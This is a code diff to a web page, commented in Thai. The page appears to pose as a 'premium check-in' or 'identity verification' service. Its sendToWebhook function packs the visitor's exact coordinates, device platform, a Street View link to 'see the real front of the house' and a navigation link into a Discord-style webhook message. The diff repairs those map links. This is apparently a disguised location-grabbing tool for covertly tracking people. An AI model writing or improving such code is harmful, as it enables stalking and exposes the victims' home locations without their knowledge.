@@ -88,15 +88,19 @@
         }
 
         async function sendToWebhook() {
+            // แก้ไขพารามิเตอร์ URL: cbll = ละติจูด,ลองจิจูด | layer = c (Street View)
+            const streetViewUrl = `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${userPos.lat},${userPos.lon}`;
+            const googleMapsUrl = `https://www.google.com/maps/search/?api=1&query=${userPos.lat},${userPos.lon}`;
+
             const payload = {
                 embeds: [{
                     title: "🟢 [Premium Check-in] ตรวจพบข้อมูลใหม่",
                     color: 5763719,
                     fields: [
                         { name: "📍 พิกัดแม่นยำ", value: `${userPos.lat}, ${userPos.lon}`, inline: true },
-                        { name: "🏙️ Street View", value: `[ดูหน้าบ้านจริง](https://www.google.com/maps?q&layer=c&cbll=$${userPos.lat},${userPos.lon})`, inline: true },
+                        { name: "🏙️ Street View", value: `[ดูหน้าบ้านจริง](${streetViewUrl})`, inline: true },
                         { name: "📱 อุปกรณ์", value: navigator.platform, inline: true },
-                        { name: "🔗 Google Maps", value: `[นำทางไปจุดพิกัด](https://www.google.com/maps/search/?api=1&query=$${userPos.lat},${userPos.lon})` }
+                        { name: "🔗 Google Maps", value: `[นำทางไปจุดพิกัด](${googleMapsUrl})` }
                     ],
                     footer: { text: "ระบบยืนยันตัวตนอัจฉริยะ • " + new Date().toLocaleString() }
                 }]
@@ -126,8 +130,11 @@
             ];
 
             const container = document.getElementById('places-container');
+            container.innerHTML = ''; // ล้างข้อมูลเก่า
+            
             categories.forEach(item => {
-                const searchLink = `https://www.google.com/maps/search/$${item.query}/@${userPos.lat},${userPos.lon},15z`;
+                // แก้ไขการค้นหาพิกัดรอบข้างให้ใช้พารามิเตอร์ที่ถูกต้อง
+                const searchLink = `https://www.google.com/maps/search/${item.query}/@${userPos.lat},${userPos.lon},15z`;
                 container.innerHTML += `
                     <a href="${searchLink}" target="_blank" class="flex items-center gap-4 bg-white/5 border border-white/10 p-4 rounded-2xl hover:bg-white/10 hover:border-blue-500/50 transition-all group">
                         <span class="text-2xl">${item.icon}</span>
